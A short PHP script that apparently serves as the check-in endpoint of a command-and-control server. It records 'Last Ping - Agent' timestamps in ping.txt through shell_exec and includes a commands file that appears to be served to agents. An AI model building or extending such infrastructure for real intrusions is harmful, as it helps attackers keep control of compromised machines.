<?php

include("/var/www/html/cmds.txt");

$id = intval($_GET['id']);
$sid = strval($id);

if (!empty($id)) {

shell_exec("cat ping.txt | grep -v ".$sid." > temping");
shell_exec("cat temping > ping.txt");

$time = date("Y-m-d H:i:s"); 
$file = 'ping.txt';
$current = file_get_contents($file);
$current .= "Last Ping - Agent ".$id." => ".$time.PHP_EOL;
file_put_contents($file, $current);


}




?>
